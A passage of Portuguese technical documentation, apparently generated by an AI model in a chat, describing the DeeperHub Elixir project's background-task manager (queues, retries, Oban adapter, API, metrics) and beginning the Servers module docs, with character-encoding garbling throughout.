*(Nota: A documenta√ß√£o original tem `DeeperHub.BackgroundTasks` com v√°rios subm√≥dulos como `BackgroundTasksFacade`, `Adapters.BackgroundTasksAdapter`, `Services.DefaultBackgroundTaskService`, etc. Esta documenta√ß√£o consolida a fachada em `DeeperHub.Core.BackgroundTaskManager` e assume que a l√≥gica de servi√ßo e adapta√ß√£o pode residir em `DeeperHub.BackgroundTasks.*` como um subm√≥dulo do Core ou um contexto de dom√≠nio pr√≥prio, dependendo da complexidade desejada.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Enfileiramento de Tarefas (`enqueue_task/3` ou `schedule_task/3`):**
    *   Permitir que qualquer m√≥dulo da aplica√ß√£o enfileire uma tarefa para execu√ß√£o ass√≠ncrona.
    *   Especificar o m√≥dulo e fun√ß√£o do \"worker\" a ser executado e seus argumentos.
*   **Agendamento de Tarefas (`schedule_recurring_task/4`):**
    *   Agendar tarefas para execu√ß√£o em um momento espec√≠fico no futuro.
    *   Agendar tarefas recorrentes (ex: usando sintaxe cron).
*   **Execu√ß√£o de Tarefas:**
    *   Gerenciar um pool de workers para processar tarefas da fila.
    *   Garantir que as tarefas sejam executadas de forma isolada e confi√°vel.
*   **Gerenciamento de Filas (Opcional, dependendo do backend):**
    *   Suporte a m√∫ltiplas filas com diferentes prioridades.
*   **Pol√≠ticas de Retentativa:**
    *   Implementar retentativas autom√°ticas para tarefas que falham, com backoff exponencial configur√°vel.
    *   Definir um n√∫mero m√°ximo de tentativas.
*   **Tratamento de Falhas e Dead-Letter Queue (DLQ):**
    *   Mover tarefas que falham consistentemente para uma DLQ para an√°lise manual.
*   **Monitoramento e Status de Tarefas (`get_task_status/2`):**
    *   Permitir a consulta do status de tarefas individuais (pendente, em execu√ß√£o, conclu√≠da, falha).
    *   Fornecer estat√≠sticas sobre o sistema de tarefas (n√∫mero de tarefas na fila, workers ativos, taxa de erro, etc.) (`get_statistics/1`).
*   **Cancelamento de Tarefas (`cancel_task/2`, `cancel_recurring_task/2`):**
    *   Permitir o cancelamento de tarefas pendentes ou agendadas.
*   **Abstra√ß√£o de Backend:**
    *   Fornecer uma interface (`BackgroundTasksBehaviour`) para que diferentes backends de enfileiramento (Oban, Exq, etc.) possam ser usados.
*   **Observabilidade:**
    *   Registrar logs detalhados sobre o ciclo de vida das tarefas.
    *   Emitir m√©tricas sobre o desempenho do sistema de tarefas.
*   **Limpeza de Tarefas Antigas (`cleanup_old_tasks/2`):**
    *   Remover registros de tarefas conclu√≠das ou falhas antigas para manter o sistema limpo.
*   **Idempot√™ncia (Responsabilidade do Worker):**
    *   Os workers devem ser projetados para serem idempotentes, se poss√≠vel, para lidar com reprocessamentos.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.BackgroundTaskManager` (Fachada P√∫blica):**
    *   Ponto de entrada para enfileirar, agendar e gerenciar tarefas.
    *   Delega para o `BackgroundTasksAdapter` configurado.
2.  **`DeeperHub.BackgroundTasks.Adapters.BackgroundTasksAdapter` (Behaviour e Implementa√ß√µes):**
    *   **Responsabilidade:** Abstrair a biblioteca de enfileiramento subjacente.
    *   **Comportamento (`BackgroundTasksBehaviour`):** Define a interface.
    *   **Implementa√ß√µes:**
        *   `ObanAdapter`: Para integrar com a biblioteca Oban.
        *   `ExqAdapter`: Para integrar com Exq (baseado em Redis).
        *   `SimpleEtsQueueAdapter` (GenServer/ETS): Uma implementa√ß√£o leve para cen√°rios mais simples ou testes, sem persist√™ncia robusta entre rein√≠cios.
        *   `NoOpAdapter`: N√£o executa tarefas, √∫til para desabilitar em certos ambientes.
3.  **Workers de Tarefas (Definidos pela Aplica√ß√£o):**
    *   M√≥dulos Elixir que implementam a l√≥gica de uma tarefa espec√≠fica. Eles geralmente seguem um comportamento esperado pelo backend de enfileiramento (ex: `Oban.Worker`).
    *   Ex: `DeeperHub.Notifications.Workers.EmailWorker`, `DeeperHub.Audit.Workers.LogProcessingWorker`.
4.  **Backend de Enfileiramento (Externo ou Embutido):**
    *   O sistema real que armazena as filas e gerencia os workers (ex: PostgreSQL para Oban, Redis para Exq, ou ETS para uma solu√ß√£o simples).
5.  **`DeeperHub.BackgroundTasks.Supervisor` (ou `UnifiedSupervisor`):**
    *   Supervisiona os processos do adaptador de tarefas (se for um GenServer) e quaisquer workers de gerenciamento interno (ex: `CleanupWorker`). O backend de enfileiramento (como Oban) geralmente tem seu pr√≥prio supervisor.
6.  **`DeeperHub.BackgroundTasks.Integrations.AuditIntegration`, `EventIntegration`, `MetricsIntegration`, `NotificationIntegration`:**
    *   Subm√≥dulos para integrar o sistema de tarefas com auditoria, eventos, m√©tricas e notifica√ß√µes.
7.  **Configura√ß√µes (via `DeeperHub.Core.ConfigManager`):**
    *   Qual adaptador usar, configura√ß√µes de conex√£o para o backend (Redis URL, DB Repo), configura√ß√µes de fila, pol√≠ticas de retry padr√£o, etc.

### 3.2. Estrutura de Diret√≥rios (Proposta para `BackgroundTasks` como subm√≥dulo do Core ou contexto)

Se for um contexto pr√≥prio:
```
lib/deeper_hub/background_tasks/
‚îú‚îÄ‚îÄ background_task_manager.ex      # Fachada P√∫blica (Core.BackgroundTaskManager)
‚îÇ
‚îú‚îÄ‚îÄ adapters/
‚îÇ   ‚îú‚îÄ‚îÄ background_tasks_adapter.ex   # Behaviour e Default Adapter (que usa uma implementa√ß√£o)
‚îÇ   ‚îú‚îÄ‚îÄ oban_adapter.ex
‚îÇ   ‚îî‚îÄ‚îÄ simple_ets_queue_adapter.ex
‚îÇ
‚îú‚îÄ‚îÄ services/                       # (Se a l√≥gica do adapter for complexa)
‚îÇ   ‚îî‚îÄ‚îÄ default_background_tasks_service.ex # Exemplo de servi√ßo que usa o adapter
‚îÇ
‚îú‚îÄ‚îÄ integrations/
‚îÇ   ‚îú‚îÄ‚îÄ audit_integration.ex
‚îÇ   ‚îú‚îÄ‚îÄ event_integration.ex
‚îÇ   ‚îú‚îÄ‚îÄ metrics_integration.ex
‚îÇ   ‚îî‚îÄ‚îÄ notification_integration.ex
‚îÇ
‚îú‚îÄ‚îÄ schema/                         # Schemas Ecto se o backend (ex: Oban) usar o DB
‚îÇ   ‚îî‚îÄ‚îÄ oban_jobs_schema.ex         # (Geralmente definido pela biblioteca Oban)
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```
Ou se a fachada `Core.BackgroundTaskManager` delega diretamente para adaptadores em `BackgroundTasks`:
```
lib/deeper_hub/core/
‚îî‚îÄ‚îÄ background_task_manager.ex      # Fachada P√∫blica

lib/deeper_hub/background_tasks/    # L√≥gica e adaptadores
‚îú‚îÄ‚îÄ adapters/
‚îÇ   ‚îú‚îÄ‚îÄ background_tasks_adapter.ex   # Behaviour
‚îÇ   ‚îú‚îÄ‚îÄ oban_adapter.ex
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ integrations/
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Escolha do Backend:** A escolha da biblioteca de enfileiramento (Oban, Exq, Broadway, etc.) √© uma decis√£o arquitetural chave e depende dos requisitos de persist√™ncia, confiabilidade, monitoramento e complexidade. Oban (com PostgreSQL) √© uma escolha popular e robusta em Elixir.
*   **Idempot√™ncia dos Workers:** Os workers devem ser projetados para serem idempotentes sempre que poss√≠vel, pois as tarefas podem ser reexecutadas devido a falhas ou rein√≠cios.
*   **Serializa√ß√£o de Argumentos:** Os argumentos das tarefas devem ser serializ√°veis (termos simples, mapas, listas) para serem armazenados na fila.
*   **Concorr√™ncia e Recursos:** Configurar o n√∫mero de workers e filas para balancear o processamento de tarefas com os recursos dispon√≠veis do sistema.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Envio de Email de Boas-Vindas:**
    *   Ap√≥s um usu√°rio se registrar, `DeeperHub.Accounts` enfileira uma tarefa: `BackgroundTaskManager.enqueue_task(DeeperHub.Notifications.Workers.EmailWorker, :send_welcome_email, [user_id])`.
    *   O `EmailWorker` executa assincronamente, constr√≥i e envia o email.
*   **Processamento de Upload de V√≠deo:**
    *   Usu√°rio faz upload de um v√≠deo. O controller API salva o arquivo e enfileira uma tarefa: `BackgroundTaskManager.enqueue_task(MyApp.VideoProcessingWorker, :process_video, [video_id, %{target_formats: [\"mp4\", \"webm\"]}])`.
    *   O `VideoProcessingWorker` realiza a transcodifica√ß√£o demorada em background.
*   **Limpeza Di√°ria de Dados:**
    *   Uma tarefa recorrente √© agendada: `BackgroundTaskManager.schedule_recurring_task(MyApp.DataCleanupWorker, :cleanup_old_records, [], \"0 3 * * *\")` (√†s 3 da manh√£ todos os dias).
*   **Sincroniza√ß√£o com API Externa:**
    *   `BackgroundTaskManager.enqueue_task(MyApp.ExternalSyncWorker, :sync_product_data, [product_id], opts_with_retry)`.

## üåä 5. Fluxos Importantes

### Fluxo de Enfileiramento e Execu√ß√£o de Tarefa (Exemplo com Oban-like)

1.  **M√≥dulo Chamador:** Chama `DeeperHub.Core.BackgroundTaskManager.enqueue_task(MyApp.MyWorker, :perform, [arg1, arg2], opts)`.
2.  **`Core.BackgroundTaskManager` (Fachada):** Delega para o `BackgroundTasksAdapter`.
3.  **`BackgroundTasksAdapter` (ex: `ObanAdapter`):**
    *   Cria um novo job Oban (ou o formato do backend) com os argumentos serializados, nome do worker, op√ß√µes de fila, retentativas, etc.
    *   Insere o job no banco de dados (PostgreSQL, no caso do Oban).
    *   Retorna `{:ok, task_id}` (ID do job Oban).
4.  **Backend de Enfileiramento (Oban):**
    *   Workers Oban (processos separados) monitoram o banco de dados por novos jobs em suas filas.
    *   Um worker dispon√≠vel pega o job.
    *   Desserializa os argumentos.
    *   Chama a fun√ß√£o `perform/1` (ou `perform/2` com o job) do `MyApp.MyWorker` com os argumentos.
5.  **`MyApp.MyWorker`:**
    *   Executa a l√≥gica da tarefa.
    *   **Sucesso:** Retorna `{:ok, result}` ou `:ok`. O backend marca o job como `completed`.
    *   **Falha (Exce√ß√£o):** O backend captura a exce√ß√£o, marca o job como `retryable` (ou `discarded` se exceder retentativas), registra o erro, e agenda uma retentativa conforme a pol√≠tica.
    *   **Falha (Retorno `{:error, reason}`):** Similar √† exce√ß√£o.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Core.BackgroundTaskManager`)

*(Baseado na documenta√ß√£o original, consolidando e clarificando)*

### 6.1. `DeeperHub.Core.BackgroundTaskManager.enqueue_task(worker_module :: module(), function_atom :: atom(), args :: list(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Enfileira uma tarefa para execu√ß√£o ass√≠ncrona o mais r√°pido poss√≠vel.
*   **`worker_module`:** O m√≥dulo do worker que cont√©m a fun√ß√£o a ser executada.
*   **`function_atom`:** O nome da fun√ß√£o a ser executada no worker (ex: `:perform`).
*   **`args`:** Lista de argumentos a serem passados para a fun√ß√£o do worker. Devem ser serializ√°veis.
*   **`opts`:**
    *   `:queue` (String.t | atom): Nome da fila para enfileirar a tarefa. (Padr√£o: fila default do backend)
    *   `:priority` (integer): Prioridade da tarefa (se suportado pelo backend).
    *   `:max_attempts` (integer): N√∫mero m√°ximo de tentativas. (Padr√£o: config global)
    *   `:retry_delay_seconds` (integer): Atraso base para retentativas.
    *   `:timeout_seconds` (integer): Timeout de execu√ß√£o da tarefa.
    *   `:unique_for_seconds` (integer | nil): Se definido, garante que apenas uma tarefa com a mesma combina√ß√£o worker/fun√ß√£o/args seja enfileirada dentro deste per√≠odo.
*   **Retorno:** `{:ok, task_id}` (ID √∫nico da tarefa/job) ou `{:error, reason}`.

### 6.2. `DeeperHub.Core.BackgroundTaskManager.schedule_task(worker_module :: module(), function_atom :: atom(), args :: list(), scheduled_at :: DateTime.t() | non_neg_integer(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Agenda uma tarefa para ser executada em um momento espec√≠fico no futuro ou ap√≥s um atraso.
*   **`scheduled_at`:** Um `DateTime.t()` para agendamento absoluto, ou um `non_neg_integer()` para segundos de atraso a partir de agora.
*   *(Outros par√¢metros e `opts` similares a `enqueue_task/4`)*

### 6.3. `DeeperHub.Core.BackgroundTaskManager.schedule_recurring_task(task_name_id :: String.t(), worker_module :: module(), function_atom :: atom(), args :: list(), cron_expression :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Agenda uma tarefa para execu√ß√£o recorrente usando uma express√£o CRON.
*   **`task_name_id`:** Um ID √∫nico para identificar esta tarefa recorrente (para atualiza√ß√µes/cancelamento).
*   **`cron_expression`:** Ex: `\"0 * * * *\"` (a cada hora).
*   *(Outros par√¢metros e `opts` similares a `enqueue_task/4`, mais op√ß√µes de timezone, etc.)*

### 6.4. `DeeperHub.Core.BackgroundTaskManager.cancel_task(task_id :: String.t(), opts :: keyword()) :: :ok | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Tenta cancelar uma tarefa pendente ou agendada. N√£o garante o cancelamento se a tarefa j√° estiver em execu√ß√£o.
*   **`opts`:** `:reason` (String.t).

### 6.5. `DeeperHub.Core.BackgroundTaskManager.cancel_recurring_task(task_name_id :: String.t(), opts :: keyword()) :: :ok | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Cancela/desabilita uma tarefa recorrente.

### 6.6. `DeeperHub.Core.BackgroundTaskManager.get_task_status(task_id :: String.t(), opts :: keyword()) :: {:ok, TaskStatus.t()} | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Obt√©m o status atual de uma tarefa.
*   **`TaskStatus.t()`:** `%{id: String.t(), status: :pending | :running | :completed | :failed | :retryable | :discarded, queue: String.t, worker: module(), attempts: integer(), last_error: String.t() | nil, inserted_at: DateTime.t(), scheduled_at: DateTime.t() | nil}`.

### 6.7. `DeeperHub.Core.BackgroundTaskManager.list_tasks(opts :: keyword()) :: {:ok, list(TaskStatus.t()), Pagination.t()} | {:error, term()}`

*   **Descri√ß√£o:** Lista tarefas com filtros e pagina√ß√£o.
*   **`opts`:** `:status`, `:queue`, `:worker_module`, `:page`, `:per_page`, `:sort_by`.
*   **`Pagination.t()`:** `%{total_entries: integer(), total_pages: integer(), page_number: integer(), page_size: integer()}`.

### 6.8. `DeeperHub.Core.BackgroundTaskManager.get_statistics(opts :: keyword()) :: {:ok, map()}`

*   **Descri√ß√£o:** Retorna estat√≠sticas sobre as filas e workers.
*   **Exemplo de Retorno:** `%{queues: %{\"default\" => %{pending: 100, running: 5, failed_today: 2}, ...}, workers_summary: %{total_busy: 5, total_idle: 15}}`.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:core, :background_tasks, :enabled]`** (Boolean): Habilita/desabilita o sistema. (Padr√£o: `true`)
*   **`[:core, :background_tasks, :adapter]`** (Module): M√≥dulo adaptador a ser usado (ex: `DeeperHub.BackgroundTasks.Adapters.ObanAdapter`). (Obrigat√≥rio se enabled)
*   **`[:core, :background_tasks, :default_queue_name]`** (String): Nome da fila padr√£o. (Padr√£o: `\"default\"`)
*   **`[:core, :background_tasks, :default_max_attempts]`** (Integer): N√∫mero m√°ximo de tentativas padr√£o para tarefas. (Padr√£o: `5`)
*   **`[:core, :background_tasks, :default_retry_delay_seconds]`** (Integer): Atraso base para retentativas.
*   **`[:core, :background_tasks, :cleanup_worker, :retention_days_completed]`** (Integer): Reten√ß√£o para jobs conclu√≠dos.
*   **`[:core, :background_tasks, :cleanup_worker, :retention_days_failed]`** (Integer): Reten√ß√£o para jobs que falharam permanentemente.
*   **Configura√ß√µes espec√≠ficas do adaptador (prefixadas):**
    *   Ex: `[:core, :background_tasks, :oban_adapter, :repo]` (M√≥dulo Ecto.Repo para Oban).
    *   Ex: `[:core, :background_tasks, :oban_adapter, :queues]` (Configura√ß√£o de filas Oban).
    *   Ex: `[:core, :background_tasks, :exq_adapter, :redis_url]`.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.Metrics`: Para m√©tricas.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar o adaptador e workers.
*   `DeeperHub.BackgroundTasks.Integrations.*`: Para auditoria, eventos, etc.

### 8.2. Bibliotecas Externas

*   A biblioteca de enfileiramento escolhida (ex: `Oban`, `Exq`).
*   `Jason` (ou similar) para serializa√ß√£o de argumentos de tarefas, se o backend exigir.

## ü§ù 9. Como Usar / Integra√ß√£o

**Enfileirando uma Tarefa Simples:**
```elixir
defmodule MyApp.EmailService do
  alias DeeperHub.Core.BackgroundTaskManager

  def send_welcome_email_async(user_id) do
    BackgroundTaskManager.enqueue_task(
      MyApp.Workers.EmailSenderWorker, 
      :send_welcome, 
      [user_id],
      queue: \"emails\" # Opcional, usar fila espec√≠fica
    )
  end
end

defmodule MyApp.Workers.EmailSenderWorker do
  # Se usando Oban: use Oban.Worker
  # Se usando um sistema simples, pode ser um m√≥dulo com uma fun√ß√£o `perform`
  
  def perform(user_id) do # ou perform(%Oban.Job{args: %{\"user_id\" => user_id}})
    # ... l√≥gica para buscar usu√°rio e enviar email ...
    :ok
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o enfileiramento de tarefas e verificar se s√£o processadas (usando um backend de teste ou mocks).
*   Testar a l√≥gica de retentativa com workers que falham.
*   Testar o agendamento de tarefas futuras e recorrentes.
*   Testar o cancelamento de tarefas.
*   Testar a consulta de status e listagem de tarefas.
*   Localiza√ß√£o: `test/deeper_hub/core/background_task_manager/` e `test/deeper_hub/background_tasks/`.

### 10.2. M√©tricas (via `BackgroundTasks.Integrations.MetricsIntegration`)

*   `deeper_hub.background_tasks.jobs.enqueued.count` (tags: `queue`, `worker_module`)
*   `deeper_hub.background_tasks.jobs.processed.count` (tags: `queue`, `worker_module`, `status` (`completed`, `failed`, `discarded`))
*   `deeper_hub.background_tasks.jobs.execution_time_ms` (Histograma, tags: `queue`, `worker_module`)
*   `deeper_hub.background_tasks.jobs.wait_time_ms` (Histograma, tags: `queue`, `worker_module`): Tempo na fila.
*   `deeper_hub.background_tasks.queue.size.gauge` (Gauge, tags: `queue_name`): N√∫mero de jobs pendentes.
*   `deeper_hub.background_tasks.workers.active.gauge` (Gauge, tags: `queue_name`): N√∫mero de workers ativos processando.
*   `deeper_hub.background_tasks.workers.available.gauge` (Gauge, tags: `queue_name`): N√∫mero de workers ociosos.

### 10.3. Logs

*   **N√≠vel INFO:** Tarefa enfileirada, tarefa iniciada, tarefa conclu√≠da com sucesso. Execu√ß√£o de cleanup.
*   **N√≠vel WARNING:** Tarefa falhou e ser√° retentada. Fila atingindo alta capacidade.
*   **N√≠vel ERROR:** Tarefa falhou ap√≥s todas as tentativas e foi descartada (DLQ). Erro cr√≠tico no sistema de background tasks.

### 10.4. Telemetria (via biblioteca de backend ou `BackgroundTasks.Telemetry`)

As bibliotecas como Oban j√° emitem muitos eventos Telemetry. Se for uma implementa√ß√£o customizada, definir eventos como:
*   `[:deeper_hub, :background_tasks, :job, :enqueue]`
*   `[:deeper_hub, :background_tasks, :job, :start]`
*   `[:deeper_hub, :background_tasks, :job, :stop]` (com status de sucesso/falha)
*   `[:deeper_hub, :background_tasks, :job, :retry]`

## ‚ùå 11. Tratamento de Erros

*   **Falha no Worker:** O backend de enfileiramento deve capturar exce√ß√µes nos workers, registrar o erro e aplicar a pol√≠tica de retentativa.
*   **Backend Indispon√≠vel:** Se o backend (ex: DB para Oban, Redis para Exq) estiver indispon√≠vel, o enfileiramento de novas tarefas falhar√°. A aplica√ß√£o deve lidar com isso (ex: logar o erro e talvez tentar mais tarde, ou informar o usu√°rio se a a√ß√£o for cr√≠tica).
*   **Serializa√ß√£o de Argumentos:** Erros ao serializar/desserializar argumentos de tarefas devem ser tratados, geralmente resultando em falha da tarefa.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Dados Sens√≠veis em Argumentos:** Evite passar dados altamente sens√≠veis como argumentos de tarefas, se poss√≠vel. Se necess√°rio, os dados devem ser criptografados ou referenciados por ID para serem buscados pelo worker de forma segura.
*   **Workers com Acesso Controlado:** Workers que realizam opera√ß√µes privilegiadas devem ser projetados com seguran√ßa em mente, validando seus argumentos e interagindo com outros servi√ßos de forma segura.
*   **Seguran√ßa do Backend de Fila:** Proteger o acesso ao backend de fila (DB, Redis) √© crucial.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao criar novos workers, certifique-se de que eles sejam idempotentes.
*   Defina configura√ß√µes de fila, prioridade e retentativa apropriadas para cada tipo de tarefa.
*   Adicione logging e m√©tricas relevantes dentro dos seus workers.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma UI administrativa para visualizar filas, gerenciar tarefas (cancelar, reenfileirar, ver detalhes de erro) e estat√≠sticas. (Muitas bibliotecas como Oban j√° oferecem isso).
*   [ ] Adicionar suporte para \"workflows\" ou \"sagas\" onde m√∫ltiplas tarefas dependem umas das outras.
*   [ ] Permitir o cancelamento de tarefas que j√° est√£o em execu√ß√£o (se o worker suportar interrup√ß√£o graciosa).
*   [ ] Melhorar o balanceamento de carga entre m√∫ltiplas inst√¢ncias da aplica√ß√£o para processamento de tarefas.
*   [ ] Adicionar \"throttling\" de tarefas para evitar sobrecarregar APIs externas ou recursos internos.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este m√≥dulo √© um burro de carga para a aplica√ß√£o, permitindo muita flexibilidade e resili√™ncia.

O que gostaria de documentar a seguir? Talvez `DeeperHub.Shared.Utils` para cobrir os utilit√°rios gerais, ou podemos come√ßar com um m√≥dulo de dom√≠nio como `DeeperHub.Servers`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok! Vamos para `DeeperHub.Servers`. Este ser√° o nosso primeiro m√≥dulo de dom√≠nio \"principal\" a ser detalhado, e ele provavelmente usar√° muitos dos m√≥dulos Core e Security que j√° documentamos.

---

# M√≥dulo: `DeeperHub.Servers` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Servers`

O m√≥dulo `DeeperHub.Servers` √© o contexto de dom√≠nio central respons√°vel por gerenciar todas as entidades \"Servidor\" dentro da plataforma DeeperHub. Isso inclui a cria√ß√£o, configura√ß√£o, listagem, atualiza√ß√£o e exclus√£o de servidores, bem como o gerenciamento de seus metadados associados, como status, tags, pacotes de assinatura, eventos, alertas, avalia√ß√µes (reviews) e mensagens de atualiza√ß√£o.

Este m√≥dulo serve como a principal interface para que usu√°rios (propriet√°rios de servidores e jogadores) e outros sistemas interajam com os dados e funcionalidades dos servidores listados na plataforma. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Servidores (`create_server/1`, `get_server/1`, `update_server/2`, `delete_server/1`):**
    *   Cria√ß√£o de novos registros de servidor com informa√ß√µes b√°sicas (nome, descri√ß√£o, endere√ßo, porta, propriet√°rio).
    *   Busca de servidores por ID, nome, ou outros crit√©rios.
    *   Atualiza√ß√£o de informa√ß√µes do servidor.
    *   Exclus√£o (l√≥gica ou f√≠sica) de servidores.
*   **Listagem e Descoberta de Servidores (`list_servers/1`):**
    *   Fornecer funcionalidades de listagem com filtros (por tags, regi√£o, status, tipo de jogo, etc.) e ordena√ß√£o.
    *   Suporte √† pagina√ß√£o para grandes listas de servidores.
*   **Gerenciamento de Status do Servidor:**
    *   Rastrear e atualizar o status de um servidor (online, offline, manuten√ß√£o).
    *   (Opcional) Integrar com um sistema de monitoramento para obter status em tempo real.
*   **Gerenciamento de Tags de Servidor (`add_server_tag/2`, `remove_server_tag/2`, `list_server_tags/1`):**
    *   Permitir que propriet√°rios de servidores associem tags aos seus servidores para categoriza√ß√£o e descoberta.
    *   (Delega√ß√£o para `DeeperHub.Services.ServerTags`).
*   **Gerenciamento de Pacotes de Servidor (Assinaturas/VIPs) (`DeeperHub.Services.ServerPackages`):**
    *   Permitir que propriet√°rios criem e gerenciem pacotes (ex: VIP, itens) que podem ser oferecidos aos jogadores.
*   **Gerenciamento de Eventos de Servidor (`DeeperHub.Services.ServerEvents`):**
    *   Permitir que propriet√°rios criem e gerenciem eventos para seus servidores (ex: evento de XP em dobro, torneio).
*   **Gerenciamento de Alertas de Servidor (`DeeperHub.Services.ServerAlerts`):**
    *   Permitir que propriet√°rios enviem alertas ou an√∫ncios para os jogadores do seu servidor ou para a comunidade.
*   **Gerenciamento de Avalia√ß√µes (Reviews) de Servidor (`DeeperHub.Services.ServerReviews`):**
    *   Permitir que jogadores avaliem e escrevam reviews sobre os servidores.
    *   Calcular a avalia√ß√£o m√©dia de um servidor.
*   **Gerenciamento de Mensagens de Atualiza√ß√£o (`DeeperHub.Services.ServerUpdateMessages`):**
    *   Permitir que propriet√°rios postem mensagens de atualiza√ß√£o sobre seus servidores (ex: notas de patch, novidades).
*   **Gerenciamento de Convites de Servidor (`create_server_invite/1`, `list_server_invites/2`):**
    *   Permitir a cria√ß√£o e gerenciamento de c√≥digos de convite para servidores privados ou para rastrear refer√™ncias.
*   **Reputa√ß√£o do Servidor (`DeeperHub.Services.Lists.Schema.Reputation`):**
    *   (Potencial) Manter e calcular uma pontua√ß√£o de reputa√ß√£o para servidores com base em avalia√ß√µes, tempo online, modera√ß√£o, etc.
*   **Integra√ß√£o com Autentica√ß√£o e Autoriza√ß√£o:**
    *   Garantir que apenas o propriet√°rio de um servidor (ou administradores com permiss√£o) possa modificar suas configura√ß√µes.
    *   Usar `DeeperHub.Auth` e `DeeperHub.RBAC`.
*   **Observabilidade:**
    *   Registrar logs e m√©tricas para opera√ß√µes de servidor.
    *   Publicar eventos de dom√≠nio (servidor criado, atualizado, etc.) no `Core.EventBus`.
*   **Limita√ß√£o de Taxa (Rate Limiting):**
    *   Aplicar rate limiting para opera√ß√µes de cria√ß√£o ou atualiza√ß√£o frequentes (via `DeeperHub.Services.Servers.RateLimitIntegration`).

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Servers` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes relacionadas a servidores.
    *   Delega para o `ServersService` (ou `DefaultServersService`).
2.  **`DeeperHub.Servers.Services.DefaultServersService` (ou `ServersService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio para o dom√≠nio de Servidores.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para todas as opera√ß√µes CRUD com o `ServerSchema` e schemas associados (se n√£o delegados).
        *   `DeeperHub.Services.ServerTags.ServerTagsAdapter` (ou sua fachada): Para gerenciamento de tags.
        *   `DeeperHub.Services.ServerPackages.ServerPackagesAdapter`: Para pacotes.
        *   `DeeperHub.Services.ServerEvents.ServerEventsAdapter`: Para eventos.
        *   `DeeperHub.Services.ServerAlerts.ServerAlertsAdapter`: Para alertas.
        *   `DeeperHub.Services.ServerReviews.ServerReviewsAdapter`: Para reviews.
        *   `DeeperHub.Services.ServerUpdateMessages.ServerUpdateMessagesAdapter`: Para mensagens de atualiza√ß√£o.
        *   `DeeperHub.Auth`: Para verifica√ß√µes de autoriza√ß√£o (ex: quem √© o propriet√°rio).
        *   `DeeperHub.Core.EventBus`: Para publicar eventos como `server_created`.
        *   `DeeperHub.Core.Cache`: Para cachear dados de servidores frequentemente acessados.
3.  **Schemas Ecto:**
    *   **`DeeperHub.Servers.Schema.Server`:** Entidade principal do servidor.
    *   `DeeperHub.Services.ServerTags.Schema.Tag` (ou `DeeperHub.Servers.Schema.Tag` se movido para c√°).
    *   `DeeperHub.Services.ServerPackages.Schema.ServerPackage`
    *   `DeeperHub.Services.ServerEvents.Schema.Event`
    *   `DeeperHub.Services.ServerAlerts.Schema.Alert`
    *   `DeeperHub.Services.ServerReviews.Schema.Review`
    *   `DeeperHub.Services.ServerUpdateMessages.Schema.UpdateMessage`
    *   `DeeperHub.Servers.Schema.Invite`
    *   `DeeperHub.Services.Lists.Schema.Reputation` (ou `DeeperHub.Servers.Schema.Reputation`)
4.  **`DeeperHub.Servers.Storage` (ou l√≥gica dentro do `DefaultServersService`):**
    *   Encapsula as consultas Ecto diretas para o `ServerSchema` e, potencialmente, para os schemas associados mais simples, se os subm√≥dulos (`ServerTags`, etc.) forem apenas l√≥gicos e n√£o tiverem seu pr√≥prio storage.
5.  **Workers (Opcional):**
    *   `ServerStatusMonitorWorker`: Para verificar periodicamente o status online dos servidores.
    *   `ServerReputationCalculatorWorker`: Para recalcular a reputa√ß√£o dos servidores.
6.  **`DeeperHub.Servers.RateLimitIntegration`:**
    *   Aplica rate limiting para opera√ß√µes espec√≠ficas do m√≥dulo Servers.
7.  **`DeeperHub.Servers.CachedAdapter` (Opcional):**
    *   Se for decidido adicionar uma camada de cache expl√≠cita para os dados do servidor al√©m do `Core.Cache` gen√©rico. (A documenta√ß√£o original sugere isso para `ServerPackages`, `ServerEvents`, etc., o que √© uma boa pr√°tica).

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/servers/
‚îú‚îÄ‚îÄ servers.ex                        # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ default_servers_service.ex    # Servi√ßo principal do dom√≠nio Servers
‚îÇ   # Outros servi√ßos auxiliares espec√≠ficos de Servers, se necess√°rio
‚îÇ
